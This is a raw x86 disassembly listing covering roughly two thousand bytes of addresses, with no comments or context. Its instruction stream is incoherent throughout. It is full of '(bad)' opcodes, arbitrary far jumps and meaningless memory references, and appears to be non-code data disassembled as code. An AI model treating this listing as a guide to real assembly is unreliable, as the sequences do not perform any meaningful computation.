  43021a:	mov    esi,DWORD PTR [edx]
  43021c:	hlt    
  43021d:	test   ebx,ecx
  43021f:	pushf  
  430220:	enter  0x4df8,0x8b
  430224:	mov    DWORD PTR [ebp+0x8],0x894708
  43022b:	inc    ebp
  43022c:	mov    ebp,0xff8bfffc
  430231:	dec    ebp
  430232:	mov    ch,0xf4
  430234:	call   DWORD PTR [ebx-0x1]
  430237:	mov    ebx,0x8005474
  43023c:	call   DWORD PTR [ecx+0x8]
  43023f:	pop    es
  430240:	jmp    0xb8:0xacb4533
  430247:	fwait
  430248:	mov    esi,DWORD PTR [edx-0xc]
  43024b:	xor    cl,bl
  43024d:	add    BYTE PTR [ebx+0x3c83203],bl
  430253:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  430259:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  43025f:	xor    eax,DWORD PTR [eax]
  430261:	retf   
  430262:	retf   
  430263:	add    ecx,eax
  430265:	enter  0x894d,0x64
  430269:	dec    ebp
  43026a:	sbb    ah,cl
  43026c:	add    BYTE PTR [ebx-0xb9bb277],cl
  430272:	dec    DWORD PTR [ebx-0xbcfb275]
  430278:	test   DWORD PTR [ebx],esi
  43027a:	dec    ebx
  43027c:	inc    DWORD PTR [ebx]
  43027e:	inc    eax
  43027f:	enter  0x8989,0x50
  430283:	(bad)  
  430284:	call   DWORD PTR [ebx+ecx*4-0x1]
  430288:	cld    
  430289:	dec    DWORD PTR [ebp-0xa90001]
  43028f:	push   edi
  430290:	mov    BYTE PTR [edx+0x1],ch
  430293:	and    al,BYTE PTR [eax]
  430295:	pop    ecx
  430296:	inc    ebp
  430297:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43029d:	push   0xffffff89
  43029f:	pop    ecx
  4302a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4302a1:	dec    ebp
  4302a2:	add    BYTE PTR [ecx+0x45fc088b],cl
  4302a8:	jne    0x4302f4
  4302aa:	lea    eax,[eax]
  4302ac:	push   eax
  4302ad:	(bad)  
  4302ae:	dec    DWORD PTR [eax]
  4302b0:	mov    DWORD PTR [eax],eax
  4302b2:	test   al,0x0
  4302b4:	add    BYTE PTR [ebp-0x18],cl
  4302b7:	xor    ebp,DWORD PTR [ebx]
  4302b9:	add    eax,DWORD PTR [eax]
  4302bb:	mov    eax,eax
  4302bd:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4302c4:	inc    ebp
  4302c5:	mov    DWORD PTR [ebx+0x459408],ecx
  4302cb:	arpl   WORD PTR [ebx-0x372749b],cx
  4302d1:	sub    al,0x80
  4302d3:	inc    DWORD PTR [ecx]
  4302d5:	lea    eax,[eax]
  4302d7:	or     al,0x0
  4302d9:	inc    DWORD PTR [ecx-0x18]
  4302dc:	mov    ecx,DWORD PTR [ebx]
  4302de:	cld    
  4302df:	add    BYTE PTR [ecx+0x75014d],cl
  4302e5:	(bad)  
  4302e6:	xchg   ebp,eax
  4302e7:	fdivr  st,st(7)
  4302e9:	inc    eax
  4302ea:	inc    DWORD PTR [eax]
  4302ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4302ef:	xor    edx,DWORD PTR [edx+0x7201b8]
  4302f5:	add    BYTE PTR [edx],dl
  4302f7:	enter  0x4d90,0x0
  4302fb:	mov    eax,DWORD PTR [eax]
  4302fd:	hlt    
  4302fe:	add    al,0xa5
  430300:	mov    al,0xff
  430302:	add    bh,bh
  430304:	add    BYTE PTR [ebx],dh
  430306:	inc    DWORD PTR [ebx]
  430308:	sbb    al,0x89
  43030a:	jne    0x4302e8
  43030c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430312:	mov    eax,DWORD PTR [ebp-0xff0048]
  430318:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43031f:	inc    DWORD PTR [ebp-0x75]
  430322:	fisttp QWORD PTR [esi+ebp*8]
  430325:	test   DWORD PTR [esi-0x1],esp
  430328:	inc    ebp
  430329:	(bad)  
  43032a:	aas    
  43032b:	inc    ebp
  43032c:	(bad)  
  43032d:	lea    edi,[esp+eiz*2-0x1]
  430331:	inc    edi
  430333:	mov    DWORD PTR ds:0x8000c7a0,edi
  430339:	mov    ebp,esp
  43033b:	cld    
  43033c:	loop   0x4302cb
  43033e:	inc    ebp
  43033f:	(bad)  
  430340:	out    dx,al
  430341:	(bad)  
  430342:	fisttp WORD PTR [eax+0x8801c7]
  430348:	jecxz  0x43038f
  43034a:	in     al,dx
  43034b:	inc    DWORD PTR [ebp-0x4]
  43034e:	out    0x8d,eax
  430350:	aas    
  430351:	inc    edi
  430353:	jmp    FWORD PTR [eax-0x78]
  430356:	inc    DWORD PTR [ecx]
  430358:	mov    DWORD PTR [eax],0xc7043d
  43035e:	ins    BYTE PTR es:[edi],dx
  43035f:	test   edi,edi
  430361:	pandn  mm0,mm5
  430364:	aas    
  430365:	add    bh,al
  430367:	mov    esi,DWORD PTR [eax-0x4]
  43036a:	inc    DWORD PTR [eax+0xdf01ee]
  430370:	(bad)  
  430371:	or     BYTE PTR [ebp+eax*2-0x1],dh
  430375:	mov    ebp,ebx
  430377:	xchg   esp,eax
  430378:	fild   DWORD PTR [eax]
  43037a:	(bad)  
  43037b:	mov    edi,DWORD PTR [eax+0x3]
  43037e:	(bad)  
  43037f:	cmp    al,0xe7
  430381:	dec    ebp
  430382:	leave  
  430383:	mov    ebp,eax
  430385:	fsubr  DWORD PTR [edx]
  430387:	add    BYTE PTR [eax],al
  430389:	lea    ecx,[ebx-0x7f0003b4]
  43038f:	push   edx
  430390:	add    DWORD PTR [ebp+0x0],edx
  430393:	mov    esi,DWORD PTR [eax]
  430395:	mov    WORD PTR [edi],ss
  430397:	add    BYTE PTR [eax],al
  430399:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43039f:	add    ah,bh
  4303a1:	push   0x7d
  4303a3:	dec    DWORD PTR [ebx+0xd88c]
  4303a9:	push   edx
  4303aa:	mov    edx,DWORD PTR [ecx-0x4]
  4303ad:	call   DWORD PTR [eax+0x7d01fc]
  4303b3:	mov    esi,DWORD PTR [esi]
  4303b5:	cld    
  4303b6:	add    BYTE PTR [eax+0x560150],dl
  4303bc:	test   DWORD PTR [ebp+0x75],eax
  4303bf:	loop   0x43034c
  4303c1:	jmp    0xe38b:0x947dc7fc
  4303c8:	fsub   st,st(7)
  4303ca:	add    bh,al
  4303cc:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  4303d2:	add    edi,edi
  4303d4:	add    bh,bh
  4303d6:	adc    al,0xed
  4303d8:	add    dh,ah
  4303da:	push   eax
  4303db:	inc    ebp
  4303dc:	push   esi
  4303dd:	fisttp WORD PTR [ebx+0x4dc7f43f]
  4303e3:	test   BYTE PTR [ebx],dh
  4303e5:	out    0x5,al
  4303e7:	shl    BYTE PTR [edx+0x45],0x0
  4303eb:	jmp    0x4303ae
  4303ed:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  4303f4:	inc    esi
  4303f5:	jle    0x4303f7
  4303f7:	test   edi,eax
  4303f9:	(bad)  
  4303fa:	call   0x13004fe
  4303ff:	out    0x75,al
  430401:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430407:	in     al,dx
  430408:	mov    esp,edx
  43040a:	mov    ah,0x85
  43040c:	add    bh,bh
  43040e:	call   0x1292e12
  430413:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43041a:	add    ebx,esp
  43041c:	add    ah,ch
  43041e:	xor    BYTE PTR [ebp-0xff0073],al
  430424:	mov    ebx,ebp
  430426:	cld    
  430427:	jle    0x4303b2
  430429:	add    DWORD PTR gs:[eax],eax
  43042c:	add    BYTE PTR [eax+0x1],dl
  43042f:	inc    ebp
  430430:	inc    ebp
  430431:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  430437:	dec    DWORD PTR [ebx-0x3fd80318]
  43043d:	add    BYTE PTR [ebp-0xbf0040],dl
  430443:	inc    ebp
  430444:	fmul   QWORD PTR [ebx-0x4faf0400]
  43044a:	inc    ebp
  43044b:	add    DWORD PTR [ebx+0x459c00],ecx
  430451:	mov    edi,edi
  430453:	mov    eax,0xe80800ff
  430458:	inc    ebp
  430459:	sub    cl,BYTE PTR [ebx-0x47000400]
  43045f:	add    al,0x1
  430461:	rol    BYTE PTR [eax],0x1e
  430464:	jne    0x4304ab
  430466:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  43046c:	inc    DWORD PTR [ecx]
  43046e:	call   0x882d73
  430473:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  430479:	call   0x432e7f
  43047e:	xor    bh,bh
  430480:	push   edi
  430481:	adc    BYTE PTR [ebx-0x74741bbb],al
  430487:	fsub   st,st(4)
  430489:	ret    
  43048a:	loopne 0x430427
  43048c:	xor    DWORD PTR [edx],0x31
  43048f:	cmp    edi,edi
  430491:	bswap  eax
  430493:	rol    BYTE PTR gs:[eax],0x5
  430497:	jmp    0x12e05e1
  43049c:	mov    eax,DWORD PTR [ebp-0x4]
  43049f:	add    BYTE PTR [eax+0xff0100],bh
  4304a5:	cld    
  4304a6:	jne    0x430525
  4304a8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4304ae:	jb     0x4304b1
  4304b0:	add    BYTE PTR [eax],al
  4304b2:	push   eax
  4304b3:	fild   DWORD PTR [ebp+0x0]
  4304b6:	mov    edx,DWORD PTR [eax-0x68]
  4304b9:	inc    ebp
  4304ba:	add    BYTE PTR [ebx+0xffa8ff],cl
  4304c0:	or     bh,bh
  4304c2:	inc    ebp
  4304c3:	call   0x1272bc7
  4304c8:	jge    0x430517
  4304ca:	adc    BYTE PTR [ebx+0x459cb9],cl
  4304d0:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  4304d6:	fwait
  4304d7:	mov    eax,0x30132
  4304dc:	lea    esi,[ebp+0x2c]
  4304df:	xor    edi,edi
  4304e1:	(bad)  
  4304e2:	call   0x1422e4f
  4304e7:	call   0x1372e77
  4304ec:	jne    0x430479
  4304ee:	xor    edi,esp
  4304f0:	add    eax,DWORD PTR [eax+0xc018d]
  4304f6:	push   DWORD PTR [eax]
  4304f8:	call   0xcc2e54
  4304fd:	enter  0x45ff,0xe0
  430501:	mov    ecx,DWORD PTR [ebp-0x28]
  430504:	xor    eax,DWORD PTR [eax]
  430506:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43050c:	(bad)  
  43050d:	xchg   ebp,eax
  43050e:	call   0x1420612
  430513:	mov    cl,0x45
  430515:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43051b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  430522:	mov    edi,edi
  430524:	or     BYTE PTR [eax],cl
  430526:	inc    ebp
  430527:	test   DWORD PTR gs:[eax],eax
  43052a:	je     0x430571
  43052c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  430532:	xor    edx,DWORD PTR [eax-0x73]
  430535:	push   ebp
  430536:	or     BYTE PTR [ebp+0x21007572],al
  43053c:	inc    ebp
  43053d:	loopne 0x4304ca
  43053f:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  430546:	int    0x0
  430548:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  43054e:	inc    ebp
  43054f:	push   ebp
  430550:	cmp    ebp,eax
  430552:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  430559:	cld    
  43055a:	fadd   QWORD PTR [eax+0x3b014d]
  430560:	jne    0x430592
  430562:	push   0xf8898557
  430567:	loopne 0x4305de
  430569:	inc    ebp
  43056a:	lea    eax,[ebx+0x72e8e4cc]
  430570:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  430576:	jmp    0x4305ab
  430578:	mov    edi,DWORD PTR [edi+0x4572bc]
  43057e:	xor    eax,edi
  430580:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43058a:	rcl    BYTE PTR [eax-0x40],1
  43058d:	inc    ebp
  43058e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430596:	inc    ebp
  430597:	xchg   ebp,eax
  430598:	ud0    ebp,DWORD PTR [ebx]
  43059b:	inc    DWORD PTR [eax]
  43059d:	daa    
  43059e:	jbe    0x4305a0
  4305a0:	mov    dl,BYTE PTR [eax-0x80]
  4305a3:	push   ebp
  4305a4:	pop    ds
  4305a5:	mov    ecx,DWORD PTR [esp+esi*8]
  4305a8:	inc    eax
  4305a9:	retf   
  4305aa:	inc    ebp
  4305ab:	iret   
  4305ac:	jb     0x430576
  4305ae:	mov    eax,DWORD PTR [edi]
  4305b0:	int3   
  4305b1:	inc    ebp
  4305b2:	inc    ebp
  4305b3:	add    DWORD PTR [ecx],esi
  4305b5:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  4305bc:	xor    dh,BYTE PTR [ebx]
  4305be:	pushf  
  4305bf:	lea    ecx,[ecx+0x4d72d808]
  4305c5:	add    BYTE PTR [ebx],dh
  4305c7:	inc    ebp
  4305c8:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  4305ce:	xor    dl,BYTE PTR [edx]
  4305d0:	add    eax,DWORD PTR [ebp-0x77]
  4305d3:	mov    eax,esp
  4305d5:	fmul   QWORD PTR [ebp-0x3d]
  4305d8:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  4305df:	mov    DWORD PTR [ebp-0x24],eax
  4305e2:	rol    DWORD PTR [ebp-0x64],1
  4305e5:	xor    eax,edi
  4305e7:	mov    ecx,0xff858db0
  4305ec:	clc    
  4305ed:	enter  0x4d45,0x3c
  4305f1:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  4305f8:	test   esi,edi
  4305fa:	clc    
  4305fb:	inc    DWORD PTR [ebp+0x45]
  4305fe:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430606:	test   DWORD PTR [ecx],esi
  430608:	clc    
  430609:	pushf  
  43060a:	inc    ebp
  43060b:	(bad)  
  43060c:	cmp    ah,bh
  43060e:	pushf  
  43060f:	inc    ebp
  430610:	mov    edx,DWORD PTR [eax-0x24]
  430613:	add    BYTE PTR [ebp+0x0],dl
  430616:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43061c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  430620:	add    al,dl
  430622:	jmp    0x10407f2
  430627:	jb     0x430676
  430629:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  43062f:	xor    ecx,DWORD PTR [ebp+0x3b]
  430632:	xor    ecx,DWORD PTR [edi]
  430634:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  430638:	(bad)  
  43063a:	clc    
  43063b:	int3   
  43063c:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  430643:	push   cs
  430644:	xor    ecx,eax
  430646:	xor    esp,ecx
  430648:	add    ebp,DWORD PTR [eax]
  43064a:	add    esi,DWORD PTR [eax]
  43064c:	(bad)  
  43064e:	retf   0x55cc
  430651:	repnz mov eax,DWORD PTR [ebp-0x10]
  430655:	(bad)  
  430656:	cli    
  430657:	fdiv   st(1),st
  430659:	test   DWORD PTR [eax+edi*8],ecx
  43065c:	dec    ebp
  43065d:	inc    ebp
  43065e:	xor    edi,DWORD PTR [eax-0x7167afd]
  430664:	add    BYTE PTR [ebp+0x0],al
  430667:	mov    ecx,DWORD PTR [ebp-0x24]
  43066a:	mov    ecx,ebx
  43066c:	clc    
  43066d:	jne    0x43063a
  43066f:	mov    esi,0xd672d3
  430674:	into   
  430675:	into   
  430676:	scas   eax,DWORD PTR es:[edi]
  430677:	dec    ebp
  430678:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  43067e:	sub    ecx,esi
  430680:	cmp    ecx,DWORD PTR [ebp+0x77]
  430683:	(bad)  
  430684:	mov    edi,eax
  430686:	mov    al,0x85
  430688:	mov    eax,edi
  43068a:	add    BYTE PTR [ebp-0x75],al
  43068d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430694:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43069a:	(bad)  
  43069c:	retf   0x559c
  43069f:	(bad)  
  4306a0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4306a7:	inc    ebp
  4306a8:	add    eax,0xeb9c4d3f
  4306ad:	(bad)  
  4306ae:	mov    ecx,eax
  4306b0:	lods   al,BYTE PTR ds:[esi]
  4306b1:	test   DWORD PTR [ebp-0x8],edx
  4306b4:	xor    ecx,DWORD PTR [ebp+0x33]
  4306b7:	mov    eax,DWORD PTR [ebx]
  4306b9:	lock add ecx,ebx
  4306bc:	bswap  esi
  4306be:	retf   0x55d1
  4306c1:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  4306c7:	jmp    0x4306c2
  4306c9:	add    BYTE PTR ds:0xebc44d8b,al
  4306cf:	push   ebp
  4306d0:	mov    ebp,DWORD PTR [ebx]
  4306d2:	test   al,0x8b
  4306d4:	push   ebp
  4306d5:	clc    
  4306d6:	xor    ecx,ebx
  4306d8:	xor    ecx,esi
  4306da:	add    edx,ecx
  4306dc:	add    eax,DWORD PTR [edx+0xca010f]
  4306e2:	push   ebp
  4306e3:	dec    ebp
  4306e4:	mov    ecx,DWORD PTR [ebx-0x34050710]
  4306ea:	stc    
  4306eb:	rol    DWORD PTR ds:0xebce4dd6,cl
  4306f1:	scas   eax,DWORD PTR es:[edi]
  4306f2:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  4306f8:	xor    ebp,DWORD PTR [ebx]
  4306fa:	xor    edi,DWORD PTR [ebx]
  4306fc:	add    esi,DWORD PTR [edi+0x3]
  4306ff:	mov    ecx,DWORD PTR [edi]
  430701:	clc    
  430702:	retf   0x55cb
  430705:	into   
  430706:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43070d:	mov    eax,0x3376554d
  430712:	mov    esi,DWORD PTR [ebx]
  430714:	enter  0x5503,0x3
  430718:	xor    ecx,DWORD PTR [edi]
  43071a:	xor    ecx,edx
  43071c:	add    edx,DWORD PTR [ebp+0x3]
  43071f:	mov    ecx,DWORD PTR [edi]
  430721:	lock retf 0x4dfa
  430725:	stc    
  430726:	mov    ecx,DWORD PTR [eax]
  430728:	or     BYTE PTR [ebp+0x4d],cl
  43072b:	jmp    0x10707bb
  430730:	dec    ebp
  430731:	dec    ebp
  430732:	(bad)  
  430733:	mov    esp,esp
  430735:	clc    
  430736:	test   ebx,ecx
  430738:	clc    
  430739:	ror    DWORD PTR [ebp-0x2a],cl
  43073c:	mov    esi,ecx
  43073e:	in     al,dx
  43073f:	scas   eax,DWORD PTR es:[edi]
  430740:	inc    ebp
  430741:	mov    esi,DWORD PTR [ebx]
  430743:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  43074a:	retf   
  43074b:	ja     0x43071b
  43074d:	mov    ebp,DWORD PTR [eax-0x48]
  430750:	dec    ebp
  430751:	xor    ecx,DWORD PTR [di+0x3]
  430755:	mov    ebp,eax
  430757:	clc    
  430758:	push   ebp
  430759:	retf   
  43075a:	mov    dl,bl
  43075c:	adc    esi,edx
  43075e:	jb     0x43072e
  430760:	add    BYTE PTR [edi-0x3b7474b3],ch
  430766:	in     al,dx
  430767:	jge    0x430734
  430769:	sub    ecx,DWORD PTR [ebp+0x3b]
  43076c:	mov    esi,DWORD PTR [edi-0x24]
  43076f:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  430776:	mov    BYTE PTR [ebx-0x34b20729],cl
  43077c:	mov    edx,ebx
  43077e:	in     al,dx
  43077f:	(bad)  
  430780:	ror    esi,cl
  430782:	push   ebp
  430783:	scas   eax,DWORD PTR es:[edi]
  430784:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43078a:	fwait
  43078b:	sub    esi,DWORD PTR [edx]
  43078d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430793:	lods   al,BYTE PTR ds:[esi]
  430794:	xor    esp,DWORD PTR [ebx]
  430796:	add    ecx,DWORD PTR [ebp-0x18]
  430799:	mov    edi,DWORD PTR [ebp-0x8]
  43079c:	mov    bl,cl
  43079e:	cmp    dl,bl
  4307a0:	jb     0x430770
  4307a2:	add    dh,dl
  4307a4:	dec    ebp
  4307a5:	scas   eax,DWORD PTR es:[edi]
  4307a6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  4307ac:	shr    DWORD PTR [ebx],cl
  4307ae:	into   
  4307af:	cmp    edx,esi
  4307b1:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  4307b7:	dec    ebp
  4307b8:	dec    ebp
  4307b9:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  4307bf:	retf   
  4307c0:	xor    edx,esi
  4307c2:	add    ecx,esi
  4307c4:	imul   ecx,edx
  4307c7:	mov    DWORD PTR [ebp+0x8],edx
  4307ca:	xor    ecx,DWORD PTR [ebp+0x2b]
  4307cd:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  4307d3:	add    esi,DWORD PTR [ebx]
  4307d5:	mov    ah,0x3
  4307d7:	inc    ebp
  4307d8:	rdtsc  
  4307da:	xlat   BYTE PTR ds:[ebx]
  4307db:	pushf  
  4307dc:	jge    0x430767
  4307de:	xor    ebx,esp
  4307e0:	sub    eax,DWORD PTR [ebp-0x73]
  4307e3:	(bad)  
  4307e4:	cmp    al,al
  4307e6:	jb     0x43076d
  4307e8:	add    al,bh
  4307ea:	ror    DWORD PTR [ebp-0x7a],1
  4307ed:	xor    edi,edi
  4307ef:	add    edi,edi
  4307f1:	jmp    0x430840
  4307f3:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  4307f9:	dec    ebp
  4307fa:	into   
  4307fb:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430801:	fwait
  430802:	shl    DWORD PTR [edx],cl
  430804:	retf   0x5588
  430807:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43080d:	add    eax,DWORD PTR [eax]
  43080f:	call   0x8ace5d61
  430814:	fcom   DWORD PTR [ecx]
  430816:	retf   
  430817:	jb     0x43087e
  430819:	add    ch,cl
  43081b:	dec    ebp
  43081c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  430822:	dec    ebp
  430823:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  430829:	jge    0x4307f9
  43082b:	mov    BYTE PTR [edi+0xf723b3a],ch
  430831:	add    cl,dh
  430833:	dec    ebp
  430834:	dec    DWORD PTR [ebx-0x2c031b75]
  43083a:	adc    BYTE PTR [ebp+0x1],0x8b
  43083e:	add    ah,bl
  430840:	jge    0x4307ce
  430842:	push   0xffffff9b
  430844:	push   0x8b3032
  430849:	shl    BYTE PTR [ebp+0x55],0x6a
  43084d:	xor    edi,edi
  43084f:	xor    edx,DWORD PTR [ebx+eax*1]
  430852:	inc    ebp
  430853:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  430859:	dec    ebp
  43085a:	or     BYTE PTR [ecx+0x4dcce883],cl
  430860:	jbe    0x4307ed
  430862:	mov    esp,eax
  430864:	ror    bl,1
  430866:	enter  0x14ce,0xaf
  43086a:	dec    DWORD PTR [ebx-0x2cef13f8]
  430870:	push   ebp
  430871:	retf   0x5540
  430874:	push   ebp
  430875:	mov    esi,DWORD PTR [edx-0x18]
  430878:	mov    edx,ebx
  43087a:	cld    
  43087b:	(bad)  
  43087c:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430883:	sti    
  430884:	add    dh,cl
  430886:	push   0xffffff94
  430888:	call   FWORD PTR [ebx+0x3b5032d0]
  43088e:	mov    ecx,DWORD PTR [edi]
  430890:	enter  0x455e,0xff
  430894:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43089a:	xor    esi,DWORD PTR [ebx]
  43089c:	mov    DWORD PTR [ebx],0xcace0f9c
  4308a2:	aas    
  4308a3:	push   ebp
  4308a4:	inc    ebp
  4308a5:	xor    edx,esi
  4308a7:	add    edx,esi
  4308a9:	mov    eax,DWORD PTR [ebx]
  4308ab:	(bad)  
  4308ac:	jmp    0x43083a
  4308ae:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  4308b4:	rol    ah,1
  4308b6:	mov    esi,0xf133104d
  4308bb:	mov    edx,0xff388d80
  4308c0:	mov    dh,0xd1
  4308c2:	cmp    edx,DWORD PTR [ebp+0xf]
  4308c5:	mov    eax,DWORD PTR [edx-0x28]
  4308c8:	add    BYTE PTR [ebp-0x75],bh
  4308cb:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  4308d2:	fwait
  4308d3:	retf   0x8632
  4308d6:	cmp    ebp,0x8
  4308d9:	call   ebx
  4308db:	inc    ebp
  4308dc:	inc    ebp
  4308dd:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  4308e3:	mov    esi,DWORD PTR [ecx]
  4308e5:	int3   
  4308e6:	pushf  
  4308e7:	add    al,0xc7
  4308e9:	add    al,al
  4308eb:	add    bl,al
  4308ed:	(bad)  
  4308ee:	clc    
  4308ef:	int3   
  4308f0:	inc    ebp
  4308f1:	add    BYTE PTR [ecx],dh
  4308f3:	push   eax
  4308f4:	pushf  
  4308f5:	mov    edi,eax
  4308f7:	enter  0xc008,0x85
  4308fb:	aas    
  4308fc:	clc    
  4308fd:	gs inc ebp
  4308ff:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430905:	push   ss
  430906:	xor    ecx,DWORD PTR [ebp+0x3]
  430909:	sub    edx,DWORD PTR [ecx-0x76]
  43090c:	dec    ebp
  43090d:	add    DWORD PTR [ebx+0x88d845],ecx
  430913:	mov    esi,DWORD PTR [ebx]
  430915:	or     BYTE PTR [ebx],al
  430917:	cmp    edx,DWORD PTR [ecx-0x34]
  43091a:	dec    ebp
  43091b:	out    dx,eax
  43091c:	xor    eax,DWORD PTR [ebp+0x3]
  43091f:	mov    edx,DWORD PTR [ecx-0x28]
  430922:	dec    ebp
  430923:	add    BYTE PTR [ebx],dh
  430925:	push   0x518003
  43092a:	push   eax
  43092b:	add    BYTE PTR [ebx-0x300748b],cl
  430931:	sbb    BYTE PTR [ebp+0x45],cl
  430934:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  43093a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  430940:	dec    ebp
  430941:	inc    ebp
  430942:	xor    edx,esi
  430944:	add    edx,esi
  430946:	push   ecx
  430947:	(bad)  
  430948:	dec    ebp
  430949:	mov    al,ds:0xc5d83dff
  43094e:	retf   
  43094f:	(bad)  
  430950:	into   
  430951:	sub    bh,bh
  430953:	dec    esp
  430954:	adc    al,0x9c
  430956:	inc    ebp
  430957:	push   ebp
  430958:	test   DWORD PTR [edi],ecx
  43095a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  430961:	jmp    0xc9bc1875
  430966:	add    cl,dl
  430968:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  430972:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  430978:	rol    BYTE PTR [eax],0x54
  43097b:	clc    
  43097c:	gs jb  0x430986
  43097f:	mov    eax,DWORD PTR [ebp-0x30]
  430982:	xor    al,0x40
  430984:	sub    al,0xc7
  430986:	mov    al,ah
  430988:	add    DWORD PTR [ebp+0x4534f845],eax
  43098e:	sub    al,0x80
  430990:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430997:	mov    ch,0xff
  430999:	clc    
  43099a:	add    DWORD PTR [ebp+0x60],0x3d
  43099e:	call   FWORD PTR [eax+eax*1-0x277a77]
  4309a5:	inc    ebp
  4309a6:	dec    DWORD PTR [ebx-0x3427f701]
  4309ac:	test   esi,ecx
  4309ae:	dec    DWORD PTR [ebx-0x7f8a3701]
  4309b4:	push   eax
  4309b5:	add    DWORD PTR [ebp+0x0],eax
  4309b8:	dec    ebx
  4309ba:	or     al,0xce
  4309bc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  4309c3:	into   
  4309c4:	add    BYTE PTR [ebx-0x34ff2000],cl
  4309ca:	mov    esi,ecx
  4309cc:	sar    bh,0x45
  4309cf:	adc    al,0x8b
  4309d1:	clc    
  4309d2:	fadd   DWORD PTR [ebp+0x0]
  4309d5:	mov    ebp,DWORD PTR [edx+0x8]
  4309d8:	push   edi
  4309d9:	adc    BYTE PTR [eax+0x1],0x83
  4309dd:	add    al,al
  4309df:	retf   
  4309e0:	mov    ecx,esi
  4309e2:	cld    
  4309e3:	mov    eax,DWORD PTR [eax+0xcb01c8]
  4309e9:	into   
  4309ea:	add    BYTE PTR [ebx+0x756ae000],cl
  4309f0:	jne    0x430a25
  4309f2:	inc    DWORD PTR [ebx]
  4309f4:	rcl    BYTE PTR [ecx+0x50],1
  4309f7:	push   eax
  4309f8:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  4309fe:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430a05:	sar    bh,0x84
  430a08:	or     BYTE PTR [ebx],al
  430a0a:	push   eax
  430a0b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430a11:	pushf  
  430a12:	xor    edi,eax
  430a14:	pushf  
  430a15:	mov    ah,0x89
  430a17:	test   esp,ebp
  430a19:	clc    
  430a1a:	inc    ebp
  430a1b:	inc    ebp
  430a1c:	mov    DWORD PTR [eax+eax*8],esi
  430a1f:	sub    al,0x32
  430a21:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  430a28:	dec    ebp
  430a29:	xor    eax,DWORD PTR gs:[edi+0x3]
  430a2d:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  430a33:	xor    eax,DWORD PTR gs:[edi+0x3]
  430a37:	or     DWORD PTR [ecx+0x45ff085c],0x0
  430a3e:	shl    DWORD PTR [ebp-0x380064],1
  430a44:	enter  0x858d,0x60
  430a48:	clc    
